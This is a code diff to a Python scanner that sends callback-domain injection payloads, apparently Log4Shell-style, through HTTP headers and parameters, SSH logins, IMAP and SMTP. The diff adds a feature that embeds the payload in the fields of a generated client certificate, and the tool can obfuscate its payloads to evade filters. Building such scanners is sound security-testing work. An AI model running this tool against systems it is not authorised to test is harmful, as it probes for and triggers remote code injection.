@@ -11,6 +11,8 @@ from enum import Enum
 from time import sleep
 from urllib.parse import urlparse
 
+from utils import generate_client_cert
+
 import httpx
 from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.Hash import SHA256
@@ -141,10 +143,19 @@ LOG_LEVELS = {
 class BaseScanner:
     obfuscate_payloads = True
     request_path = None
+    path_to_clientcert = None
 
-    def __init__(self, obfuscate_payloads: bool, request_path: str) -> None:
+    def __init__(self, obfuscate_payloads: bool, request_path: str, path_to_clientcert: str = None) -> None:
         self.obfuscate_payloads = obfuscate_payloads
         self.request_path = request_path
+        self.path_to_clientcert = path_to_clientcert
+
+    def get_request_path(self, choose_random_path):
+        if choose_random_path or self.request_path is None:
+            target_path = ''.join(random.choice(string.ascii_lowercase) for _ in range(6))
+        else:
+            target_path = self.request_path
+        return target_path
 
     def _obfuscate_string(self, to_obfuscate: str) -> str:
         out = []
@@ -169,7 +180,7 @@ class BaseScanner:
             path=test_path
         )
 
-    def run_tests(self, target: str, callback_domain: str, no_payload_domain: bool, use_random_request_path: bool):
+    def run_tests(self, target: str, callback_domain: str, is_domain_in_callback: bool, use_random_request_path: bool):
         raise NotImplementedError("Use a subclass to run tests.")
 
 
@@ -181,8 +192,9 @@ class HttpScanner(BaseScanner):
         GetParam = "get"
         PostParam = "post"
 
-    def __init__(self, obfuscate_payloads: bool, request_path: str, proxy: str) -> None:
-        super().__init__(obfuscate_payloads, request_path)
+    def __init__(self, obfuscate_payloads: bool, request_path: str, path_to_clientcert: str, proxy: str, generate_clientcert: bool) -> None:
+        super().__init__(obfuscate_payloads, request_path, path_to_clientcert)
+        self.generate_clientcert = generate_clientcert
         self.proxy = proxy
 
     async def send_requests(self, client: httpx.AsyncClient, url: str, headers: dict, get_params: dict, post_params: dict) -> None:
@@ -243,12 +255,10 @@ class HttpScanner(BaseScanner):
             except Exception as excep:
                 logging.exception(excep)
 
-    async def test_injection_point(self, injection_type: InjectionPointType, callback_host: str, url: str, is_domain_in_callback: bool = True, choose_random_path: bool = True, test_path: str = None):
+    async def test_injection_point(self, injection_type: InjectionPointType, callback_host: str, url: str, is_domain_in_callback: bool = True, choose_random_path: bool = True):
         logging.info(f"Testing injection in {injection_type.value} with {callback_host} for {url}")
-        if choose_random_path:
-            target_path = ''.join(random.choice(string.ascii_lowercase) for _ in range(6))
-        else:
-            target_path = test_path
+
+        target_path = self.get_request_path(choose_random_path)
 
         for protocol in PROTOCOLS:
             logging.info(f"Testing the {protocol} protocol handler.")
@@ -286,33 +296,48 @@ class HttpScanner(BaseScanner):
                     verify=False,
                     proxies=self.proxy,
                     follow_redirects=True,
-                    max_redirects=3
+                    max_redirects=3,
+                    cert=self.path_to_clientcert,
                 ) as client:
                     await self.send_requests(client, url, headers, params, data)
 
     async def test_all_injection_points(self, url: str, callback: str, domain_in_callback: bool = True, has_random_request_path: bool = True):
         for injection_type in self.InjectionPointType:
             try:
-                await self.test_injection_point(injection_type, callback, url, domain_in_callback, has_random_request_path, self.request_path)
+                await self.test_injection_point(injection_type, callback, url, domain_in_callback, has_random_request_path)
             except Exception as excep:
                 logging.exception(str(excep))
 
-    def run_tests(self, target: str, callback_domain: str, no_payload_domain: bool, use_random_request_path: bool):
+    def run_tests(self, target: str, callback_domain: str, is_domain_in_callback: bool, use_random_request_path: bool):
+        if self.generate_clientcert and not self.path_to_clientcert:
+            target_domain = urlparse(target).netloc
+            payload = self.create_payload(
+                callback_domain, "dns",
+                self.get_request_path(use_random_request_path),
+                target_domain,
+                is_domain_in_callback
+            )
+            generate_client_cert(
+                emailAddress=f"{smtplib.quoteaddr(payload)}@{target_domain}",
+                commonName=payload,
+                subjectAltName=[f"DNS:{payload}"]
+            )
+            self.path_to_clientcert = "./injection.crt"
         asyncio.run(
             self.test_all_injection_points(
-                target, callback_domain, not no_payload_domain, use_random_request_path
+                target, callback_domain, not is_domain_in_callback, use_random_request_path
             )
         )
 
 
 class SshScanner(BaseScanner):
 
-    def __init__(self, obfuscate_payloads: bool, request_path: str) -> None:
-        super().__init__(obfuscate_payloads, request_path)
+    def __init__(self, obfuscate_payloads: bool, request_path: str, path_to_clientcert: str = None) -> None:
+        super().__init__(obfuscate_payloads, request_path, path_to_clientcert)
         self._client = SSHClient()
         self._client.set_missing_host_key_policy(WarningPolicy)
 
-    def run_tests(self, target: str, callback_domain: str, no_payload_domain: bool, use_random_request_path: bool):
+    def run_tests(self, target: str, callback_domain: str, is_domain_in_callback: bool, use_random_request_path: bool):
         if ":" in target:
             hostname, port = target.split(':')
         else:
@@ -322,14 +347,21 @@ class SshScanner(BaseScanner):
         for protocol in PROTOCOLS:
             payload = self.create_payload(
                 callback_domain, protocol,
-                self.request_path, target,
-                not no_payload_domain
+                self.get_request_path(use_random_request_path),
+                target,
+                is_domain_in_callback
             )
             try:
                 self._client.connect(hostname=hostname, port=port, username=payload, password=payload, timeout=3, look_for_keys=False, auth_timeout=2)
                 self._client.close()
             except Exception as e:
                 logging.debug(e)
+            if self.path_to_clientcert:
+                try:
+                    self._client.connect(hostname=hostname, port=port, username=payload, key_filename=self.path_to_clientcert, timeout=3, look_for_keys=False, auth_timeout=2)
+                    self._client.close()
+                except Exception as e:
+                    logging.debug(e)
 
 
 class ImapScanner(BaseScanner):
@@ -337,7 +369,7 @@ class ImapScanner(BaseScanner):
     def __init__(self, obfuscate_payloads: bool, request_path: str) -> None:
         super().__init__(obfuscate_payloads, request_path)
 
-    def run_tests(self, target: str, callback_domain: str, no_payload_domain: bool, use_random_request_path: bool):
+    def run_tests(self, target: str, callback_domain: str, is_domain_in_callback: bool, use_random_request_path: bool):
         if ":" in target:
             hostname, port = target.split(':')
         else:
@@ -347,8 +379,9 @@ class ImapScanner(BaseScanner):
         for protocol in PROTOCOLS:
             payload = self.create_payload(
                 callback_domain, protocol,
-                self.request_path, target,
-                not no_payload_domain
+                self.get_request_path(use_random_request_path),
+                target,
+                is_domain_in_callback
             )
             try:
                 mailbox = MailBox(hostname, port=port)
@@ -364,7 +397,7 @@ class SmtpScanner(BaseScanner):
         super().__init__(obfuscate_payloads, request_path)
         self._local_hostname = local_hostname
 
-    def run_tests(self, target: str, callback_domain: str, no_payload_domain: bool, use_random_request_path: bool):
+    def run_tests(self, target: str, callback_domain: str, is_domain_in_callback: bool, use_random_request_path: bool):
         if ":" in target:
             hostname, port = target.split(':')
         else:
@@ -374,8 +407,9 @@ class SmtpScanner(BaseScanner):
         for protocol in PROTOCOLS:
             payload = self.create_payload(
                 callback_domain, protocol,
-                self.request_path, target,
-                not no_payload_domain
+                self.get_request_path(use_random_request_path),
+                target,
+                is_domain_in_callback
             )
             try:
                 with SMTP(host=hostname, port=port, local_hostname=self._local_hostname) as smtp:
@@ -395,12 +429,14 @@ def parse_arguments() -> argparse.Namespace:
     parser.add_argument('-t', '--target', help="The target to check", type=str, action="store", required=True)
     parser.add_argument('-p', '--protocol', help="which protocol to test", choices=["http", "ssh", "imap", "smtp"], default="http", type=str)
     parser.add_argument('-o', '--obfuscate', help="Whether payloads should be obfuscated or not", default=False, action="store_true")
+    parser.add_argument('--certificate-path', help="Path to a client certificate for mTLS or SSH.", type=str, action="store", default=None)
     parser.add_argument('--no-payload-domain', help="Whether the original domain should be removed from the payload", default=False, action="store_true")
     parser.add_argument('--request-path', help="A custom path to add to the requests", type=str, default=None, action="store")
     parser.add_argument('-l', '--log-level', help="How detailed logging should be.", choices=LOG_LEVELS.keys(), default="error")
 
     http_opts = parser.add_argument_group("HTTP Options")
     http_opts.add_argument('--proxy', help="A proxy URL", type=str, default=None)
+    http_opts.add_argument('--generate-clientcert', help="Generates a client certificate.", action="store_true", default=False)
 
     smtp_opts = parser.add_argument_group("SMTP Options")
     smtp_opts.add_argument('--local-hostname', help="The localhost name to use, defaults to the hostname of the computer", type=str, default=None)
@@ -437,9 +473,9 @@ def main():
         callback_domain = dns_callback.domain
 
     if arguments.protocol == "http":
-        scanner = HttpScanner(arguments.obfuscate, arguments.request_path, arguments.proxy)
+        scanner = HttpScanner(arguments.obfuscate, arguments.request_path, arguments.certificate_path, arguments.proxy, arguments.generate_clientcert)
     elif arguments.protocol == "ssh":
-        scanner = SshScanner(arguments.obfuscate, arguments.request_path)
+        scanner = SshScanner(arguments.obfuscate, arguments.request_path, arguments.certificate_path)
     elif arguments.protocol == "imap":
         scanner = ImapScanner(arguments.obfuscate, arguments.request_path)
     elif arguments.protocol == "smtp":
